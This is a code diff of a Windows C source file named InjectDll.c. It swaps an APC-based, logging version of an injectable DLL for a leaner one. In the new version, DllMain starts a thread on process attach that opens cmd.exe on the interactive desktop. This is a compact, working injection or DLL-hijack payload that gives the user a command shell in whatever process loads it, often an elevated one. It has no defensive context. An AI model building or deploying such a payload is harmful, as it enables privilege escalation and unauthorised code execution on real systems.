@@ -1,73 +1,24 @@
+// InjectDll.c
 #include <Windows.h>
 
-static void WriteMarkerText(const char* text)
+DWORD WINAPI SpawnCmd(LPVOID lpParam)
 {
-    HANDLE hFile;
-    DWORD written;
-
-    hFile = CreateFileW(L"C:\\Windows\\Temp\\callback_fired.txt",
-                        GENERIC_WRITE,
-                        0,
-                        NULL,
-                        CREATE_ALWAYS,
-                        FILE_ATTRIBUTE_NORMAL,
-                        NULL);
-    if (hFile == INVALID_HANDLE_VALUE) {
-        return;
-    }
-
-    written = 0;
-    WriteFile(hFile, text, (DWORD)lstrlenA(text), &written, NULL);
-    CloseHandle(hFile);
-}
-
-VOID CALLBACK SpawnCmdApc(ULONG_PTR dwParam)
-{
-    STARTUPINFOW si = { 0 };
-    PROCESS_INFORMATION pi = { 0 };
-    char marker[128];
-    BOOL created;
-    DWORD errorCode;
-
-    (void)dwParam;
-
-    si.cb = sizeof(si);
+    STARTUPINFOW si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
     si.lpDesktop = L"WinSta0\\Default";
-
-    WriteMarkerText("Callback executed\r\n");
-
-    created = CreateProcessW(L"C:\\Windows\\System32\\cmd.exe",
-                             NULL,
-                             NULL,
-                             NULL,
-                             FALSE,
-                             CREATE_NEW_CONSOLE,
-                             NULL,
-                             NULL,
-                             &si,
-                             &pi);
-    if (!created) {
-        errorCode = GetLastError();
-        wsprintfA(marker, "Callback executed\r\nCreateProcessW failed: %lu\r\n", errorCode);
-        WriteMarkerText(marker);
-    }
-
-    if (pi.hProcess) {
-        CloseHandle(pi.hProcess);
-    }
-    if (pi.hThread) {
-        CloseHandle(pi.hThread);
-    }
+    CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, FALSE,
+                   CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
+    if (pi.hProcess) CloseHandle(pi.hProcess);
+    if (pi.hThread)  CloseHandle(pi.hThread);
+    return 0;
 }
 
-BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved)
 {
-    (void)hModule;
-    (void)lpReserved;
-
-    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
-        QueueUserAPC(SpawnCmdApc, GetCurrentThread(), 0);
+    if (reason == DLL_PROCESS_ATTACH)
+    {
+        HANDLE hThread = CreateThread(NULL, 0, SpawnCmd, NULL, 0, NULL);
+        if (hThread) CloseHandle(hThread);
     }
-
     return TRUE;
 }
